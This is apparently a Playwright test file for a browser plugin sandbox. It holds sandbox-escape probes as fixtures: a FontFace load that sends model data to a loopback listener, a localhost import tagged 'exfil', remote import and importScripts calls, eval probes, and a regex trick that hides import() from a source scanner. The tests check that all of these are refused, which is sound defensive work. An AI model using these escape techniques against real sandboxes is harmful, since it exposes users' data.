import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { expect, test, type Page } from "@playwright/test";
import { box, ready, solids } from "./helpers";

/** A listener on a free loopback port that records every request's path: where a leak would land. */
async function listener(): Promise<{ url: string; hits: string[]; close(): Promise<void> }> {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(req.url ?? "");
    res.writeHead(404, { "access-control-allow-origin": "*" });
    res.end();
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const { port } = server.address() as AddressInfo;
  return { url: `http://127.0.0.1:${port}`, hits, close: () => new Promise<void>((resolve) => server.close(() => resolve())) };
}

/** Prove the listener is reachable from the page (connect-src allows loopback), so "no hits" means something. */
async function control(page: Page, l: { url: string; hits: string[] }) {
  await page.evaluate((u) => fetch(`${u}/control`, { mode: "no-cors" }).catch(() => undefined), l.url);
  await expect.poll(() => l.hits, { timeout: 5_000 }).toContain("/control");
}

// The plugin sandbox (lane 11), proved in a real browser with real Web Workers: a plugin
// gets only what its manifest asks for, enforced by the app; it has no DOM, no network
// unless granted, no importScripts and no way to turn text into code; a plugin stuck in a
// loop is reported and stopped while the app keeps working.

type Hook = {
  plugins: {
    list(): { id: string; status: string; lastError: string | null; errors: string[]; logs: string[] }[];
    loadSession(files: Record<string, string>): Promise<string>;
    enable(id: string): Promise<void>;
    commands(): string[];
    run(key: string): Promise<void>;
  };
};

function plugin(id: string, permissions: string[], main: string, extra: Record<string, unknown> = {}) {
  return {
    "plugin.json": JSON.stringify({ id, name: id.split(".").pop(), version: "1.0.0", api: 1, description: "test", author: "Sawhorse", license: "MIT", permissions, ...extra }),
    "main.js": main,
  };
}

async function load(page: Page, files: Record<string, string>, enable = true): Promise<string> {
  const id = await page.evaluate((f) => (window as unknown as { __sawhorse: Hook }).__sawhorse.plugins.loadSession(f), files);
  if (enable) await page.evaluate((i) => (window as unknown as { __sawhorse: Hook }).__sawhorse.plugins.enable(i), id);
  return id;
}

async function entry(page: Page, id: string) {
  return page.evaluate((i) => (window as unknown as { __sawhorse: Hook }).__sawhorse.plugins.list().find((e) => e.id === i)!, id);
}

/** Wait for a log line starting with `prefix` and return the rest. */
async function logged(page: Page, id: string, prefix: string): Promise<string> {
  let line = "";
  await expect
    .poll(async () => {
      const e = await entry(page, id);
      line = e.logs.find((l) => l.includes(prefix)) ?? "";
      return line;
    }, { timeout: 10_000 })
    .not.toBe("");
  return line.slice(line.indexOf(prefix) + prefix.length);
}

const PROBE = `
import sawhorse, { model } from "sawhorse";
const report = (k, v) => console.log(k + "=" + JSON.stringify(v));
const attempt = async (k, f) => { try { report(k, { ok: true, value: await f() }); } catch (e) { report(k, { ok: false, code: e.code ?? null, message: String(e.message ?? e) }); } };
report("globals", {
  document: typeof document, window: typeof window, fetch: typeof fetch, XMLHttpRequest: typeof XMLHttpRequest,
  WebSocket: typeof WebSocket, EventSource: typeof EventSource, indexedDB: typeof indexedDB, caches: typeof caches,
  scripts: typeof self["import" + "Scripts"], Worker: typeof Worker, BroadcastChannel: typeof BroadcastChannel,
  postMessage: typeof postMessage, storage: typeof navigator.storage,
  FontFace: typeof FontFace, fonts: typeof self.fonts, fsSync: typeof webkitRequestFileSystemSync,
  fs: typeof webkitRequestFileSystem, buckets: typeof navigator.storageBuckets, locks: typeof navigator.locks,
  objectURL: typeof URL.createObjectURL, MessageChannel: typeof MessageChannel, scheme: self.location.protocol,
  textEncoder: typeof TextEncoder, response: typeof Response, offscreen: typeof OffscreenCanvas,
});
await attempt("eval", () => eval("1 + 1"));
await attempt("Function", () => new Function("return 1")());
await attempt("ctor", () => (function () {}).constructor("return 1")());
await attempt("asyncCtor", () => (async function () {}).constructor("return 1")());
await attempt("timerString", () => setTimeout("1"));
// Spelled so the static check does not refuse the probe: the runtime lock is what is tested.
await attempt("importScripts", () => self["import" + "Scripts"]("https://example.com/x.js"));
await attempt("protoFetch", () => Object.getPrototypeOf(self).fetch);
const b = model.batch("Sneaky box");
b.box({ min: [0, 0, 0], size: [0.3, 0.3, 0.3] });
await attempt("commit", () => b.commit());
await attempt("net", () => sawhorse.net.fetch("https://example.com/"));
await attempt("read", () => model.solids());
console.log("done");
`;

test("a plugin without model.write cannot change the model; without net it has no network; it has no DOM, no importScripts, no eval", async ({ page }) => {
  await ready(page);
  await box(page);
  const before = await solids(page);
  const hash = await page.locator("main.vp").getAttribute("data-volume");
  const id = await load(page, plugin("org.example.probe", ["model.read"], PROBE));
  await logged(page, id, "done");
  const g = JSON.parse(await logged(page, id, "globals="));
  expect(g).toEqual({
    document: "undefined",
    window: "undefined",
    fetch: "undefined",
    XMLHttpRequest: "undefined",
    WebSocket: "undefined",
    EventSource: "undefined",
    indexedDB: "undefined",
    caches: "undefined",
    scripts: "undefined",
    Worker: "undefined",
    BroadcastChannel: "undefined",
    postMessage: "undefined",
    storage: "undefined",
    // The verifier's escapes (FontFace(...).load() reached any URL; the sandboxed file system
    // was a covert store) and their cousins: gone with the allowlist.
    FontFace: "undefined",
    fonts: "undefined",
    fsSync: "undefined",
    fs: "undefined",
    buckets: "undefined",
    locks: "undefined",
    objectURL: "undefined",
    MessageChannel: "undefined",
    // Started from a blob: URL, so the page's content security policy governs it.
    scheme: "blob:",
    // What a plugin computes with is still there.
    textEncoder: "function",
    response: "function",
    offscreen: "function",
  });
  for (const k of ["eval", "Function", "ctor", "asyncCtor"]) {
    const r = JSON.parse(await logged(page, id, `${k}=`));
    expect(r.ok, k).toBe(false);
    expect(r.message, k).toContain("cannot turn text into code");
  }
  expect(JSON.parse(await logged(page, id, "timerString=")).message).toContain("takes a function");
  expect(JSON.parse(await logged(page, id, "importScripts="))).toMatchObject({ ok: false });
  expect(JSON.parse(await logged(page, id, "protoFetch="))).toEqual({ ok: true });
  const commit = JSON.parse(await logged(page, id, "commit="));
  expect(commit).toMatchObject({ ok: false, code: "permission" });
  expect(commit.message).toContain('"model.write"');
  expect(JSON.parse(await logged(page, id, "net="))).toMatchObject({ ok: false, code: "permission" });
  // Reading is what it asked for.
  const read = JSON.parse(await logged(page, id, "read="));
  expect(read.ok).toBe(true);
  expect(read.value).toHaveLength(1);
  // The model is exactly as it was.
  expect(await solids(page)).toEqual(before);
  await expect(page.locator("main.vp")).toHaveAttribute("data-volume", hash!);
  // Lane 15 verifier: in a real worker the lockdown removed everything it should, and the
  // constants a browser will not let it delete (TEMPORARY, PERSISTENT) are not reported as
  // survivors, so the console does not open with a false "could not remove" warning.
  const logs = (await entry(page, id)).logs.join("
");
  expect(logs).not.toContain("could not remove");
  expect(logs).not.toContain("sandbox:");
});

test("code that would load from outside is refused before it runs", async ({ page }) => {
  await ready(page);
  const dynamic = await load(page, plugin("org.example.dynamic", [], 'const m = await import("https://example.com/x.js");'), false);
  const remote = await load(page, plugin("org.example.remote", [], 'import x from "https://example.com/x.js";'), false);
  const blob = await load(page, plugin("org.example.sneaky", [], 'import/* hi */("data:text/javascript,1");'), false);
  const scripts = await load(page, plugin("org.example.scripts", [], 'importScripts("https://example.com/x.js");'), false);
  // The verifier's bypasses of the old text scanner: a regex with a quote or a backtick where
  // it guessed "division" hid the import() after it. The parser is not fooled.
  const regex = await load(page, plugin("org.example.regex", [], 'if (true) /"/.test("x"); import("data:text/javascript,export default 1");'), false);
  const thrown = await load(page, plugin("org.example.thrown", [], 'try { throw /"/; } catch {}\nimport("data:text/javascript,1");'), false);
  const tick = await load(page, plugin("org.example.tick", [], 'if (1) /`/.test(""); import("http://localhost:5212/@vite/env.js?exfil=1");'), false);
  const dflt = await load(page, plugin("org.example.dflt", [], 'export default /"/;\nimport("data:text/javascript,1");'), false);
  for (const [id, want] of [
    [dynamic, "dynamic import() is not allowed"],
    [remote, 'may import only "sawhorse"'],
    [blob, "dynamic import() is not allowed"],
    [scripts, "importScripts is not available"],
    [regex, "main.js:1: dynamic import() is not allowed"],
    [thrown, "main.js:2: dynamic import() is not allowed"],
    [tick, "main.js:1: dynamic import() is not allowed"],
    [dflt, "main.js:2: dynamic import() is not allowed"],
  ]) {
    const e = await entry(page, id);
    expect(e.status).toBe("invalid");
    expect(e.errors.join("\n")).toContain(want);
  }
});

test("a plugin stuck in a loop is reported and stopped, and the app keeps working", async ({ page }) => {
  test.setTimeout(60_000);
  await ready(page);
  const id = await load(
    page,
    plugin(
      "org.example.spinner",
      ["ui"],
      `import { ui } from "sawhorse";
await ui.registerCommand({ id: "spin", run() { for (;;) {} } });
console.log("registered");`,
      { contributes: { commands: [{ id: "spin", title: "Spin forever" }] } },
    ),
  );
  await logged(page, id, "registered");
  await expect.poll(async () => page.evaluate(() => (window as unknown as { __sawhorse: Hook }).__sawhorse.plugins.commands())).toContain("org.example.spinner/spin");
  // Run it from the Plugins menu, as a person would.
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await page.getByRole("menuitem", { name: "spinner" }).click();
  await page.getByRole("menuitem", { name: "Spin forever" }).click();
  // The app is not frozen: draw and pull a box while the plugin spins.
  await box(page);
  expect(await solids(page)).toHaveLength(1);
  await expect(page.locator("#hint")).toContainText("is not responding", { timeout: 10_000 });
  await expect(page.locator("#hint")).toContainText('running "Spin forever"');
  expect((await entry(page, id)).status).toBe("unresponsive");
  await expect.poll(async () => (await entry(page, id)).status, { timeout: 20_000 }).toBe("stopped");
  expect((await entry(page, id)).lastError).toContain("did not respond");
  // Still working afterwards, and the command went with the plugin.
  await page.keyboard.press("Control+z");
  await expect.poll(async () => (await solids(page)).length).toBe(0);
  expect(await page.evaluate(() => (window as unknown as { __sawhorse: Hook }).__sawhorse.plugins.commands())).not.toContain("org.example.spinner/spin");
});

test("a plugin that throws while loading did not start, and says why", async ({ page }) => {
  await ready(page);
  const id = await load(page, plugin("org.example.thrower", [], 'throw new Error("no thanks");'));
  await expect.poll(async () => (await entry(page, id)).status).toBe("failed");
  expect((await entry(page, id)).lastError).toContain("no thanks");
});

test("a plugin without net cannot send the model out with a font load (the verifier's escape)", async ({ page }) => {
  const l = await listener();
  try {
    await ready(page);
    await box(page);
    // The verifier's plugin, verbatim apart from the address: before the fix the request
    // carried the model's label, volume and bounds.
    const id = await load(
      page,
      plugin(
        "org.example.fontleak",
        ["model.read"],
        `import { model } from "sawhorse";
const s = await model.solids();
await new FontFace("x", "url(${l.url}/?leak=" + encodeURIComponent(JSON.stringify(s)) + ")").load().catch(() => {});
console.log("sent");`,
      ),
    );
    await expect.poll(async () => (await entry(page, id)).status, { timeout: 10_000 }).toBe("failed");
    expect((await entry(page, id)).lastError).toContain("FontFace is not defined");
    await control(page, l);
    expect(l.hits.filter((h) => h.includes("leak"))).toEqual([]);
  } finally {
    await l.close();
  }
});

test("the second lock: a worker started from a blob: URL, as every plugin's is, runs under the page's policy", async ({ page }) => {
  const l = await listener();
  try {
    await ready(page);
    const csp = (await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content")) ?? "";
    expect(csp).toContain("script-src 'self' 'wasm-unsafe-eval' blob:");
    expect(csp).toContain("font-src 'self' data:");
    // A worker without the lockdown, made the way host.ts makes a plugin's: what would get out
    // if a plugin ever got past the allowlist and the source check?
    const out = await page.evaluate(async (u) => {
      const code = `const out = {};
try { await new FontFace("x", "url(${u}/font)").load(); out.font = "loaded"; } catch (e) { out.font = "refused"; }
try { await import("${u}/module.js"); out.module = "loaded"; } catch (e) { out.module = "refused"; }
try { await import("data:text/javascript,export default 1"); out.data = "loaded"; } catch (e) { out.data = "refused"; }
try { await import(URL.createObjectURL(new Blob(["export default 1"], { type: "text/javascript" }))); out.blob = "loaded"; } catch (e) { out.blob = "refused"; }
postMessage(out);`;
      const w = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })), { type: "module" });
      const r = await new Promise((resolve) => {
        w.onmessage = (e) => resolve(e.data);
        w.onerror = (e) => resolve({ error: e.message });
      });
      w.terminate();
      return r;
    }, l.url);
    // Outside fonts and scripts and data: modules are refused before any request is made;
    // a blob: module is allowed by the policy (that is how plugin modules are linked), which is
    // why the lockdown takes URL.createObjectURL away and the source check refuses import().
    expect(out).toEqual({ font: "refused", module: "refused", data: "refused", blob: "loaded" });
    await control(page, l);
    expect(l.hits.filter((h) => h !== "/control")).toEqual([]);
  } finally {
    await l.close();
  }
});
